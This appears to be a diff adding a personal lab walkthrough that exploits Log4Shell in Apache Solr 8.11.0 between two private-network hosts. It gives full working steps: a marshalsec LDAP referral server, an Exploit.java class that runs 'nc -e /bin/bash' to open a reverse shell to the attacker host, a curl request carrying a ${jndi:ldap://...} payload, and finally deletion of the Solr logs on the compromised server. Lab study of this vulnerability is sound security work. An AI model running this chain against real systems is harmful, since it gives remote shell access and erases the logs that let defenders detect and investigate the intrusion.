@@ -1,0 +1,97 @@
+#Ubuntu 18.04 - Solr Server 172.24.0.221
+
+#Install Java
+sudo mkdir /usr/lib/jvm && cd /usr/lib/jvm
+#sudo wget http://mirrors.rootpei.com/jdk/jdk-8u181-linux-x64.tar.gz
+
+sudo tar xzvf ~/Desktop/jdk-8u181-linux-x64.tar.gz
+
+sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
+sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
+sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
+
+sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
+sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
+sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
+
+#Install Apache Solr
+cd /tmp && wget https://downloads.apache.org/lucene/solr/8.11.0/solr-8.11.0.tgz
+tar xzf solr-8.11.0.tgz solr-8.11.0/bin/install_solr_service.sh --strip-components=2
+sudo bash ./install_solr_service.sh solr-8.11.0.tgz
+
+sudo service solr stop && sudo service solr start && sudo service solr status
+
+sudo su - solr -c "/opt/solr/bin/solr create -c mycol1 -n data_driven_schema_configs"
+
+http://localhost:8983/
+
+#Install Netcat
+	sudo apt-get install netcat-traditional
+	sudo update-alternatives --config nc
+#		choose option 2
+
+
+
+
+
+
+
+
+
+
+#Ubuntu 18.04 - Attacker PC 172.24.0.223
+
+#Install package dependencies
+sudo apt-get install git vim curl maven
+
+sudo mkdir /usr/lib/jvm
+cd /usr/lib/jvm
+#sudo wget http://mirrors.rootpei.com/jdk/jdk-8u181-linux-x64.tar.gz
+
+sudo tar xzvf ~/Desktop/jdk-8u181-linux-x64.tar.gz
+
+sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
+sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
+sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
+
+sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
+sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
+sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
+
+#Setup LDAP Server
+cd ~ && git clone https://github.com/mbechler/marshalsec
+
+cd ~/marshalsec && mvn clean package -DskipTests
+
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.24.0.223:8000/#Exploit"
+
+#Create Exploit.java file
+cd ~/Documents && vim Exploit.java
+#Add below text to Exploit.java file
+public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 172.24.0.223 9999");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+javac Exploit.java
+
+#Host exploit on http server
+python3 -m http.server
+
+#Enable netcat listener
+nc -lnvp 9999
+
+#Exploit; establish reverse shell
+curl 'http://172.24.0.221:8983/solr/admin/cores?foo=$\{jndi:ldap://172.24.0.223:1389/Exploit\}'
+#Connection establihed in Netcar listener tab
+
+#Attempt exploit; was unsuccessfull to escalate priv escalation though I was able to delete Solr logs
+cd /var/solr/logs
+rm *
+
+
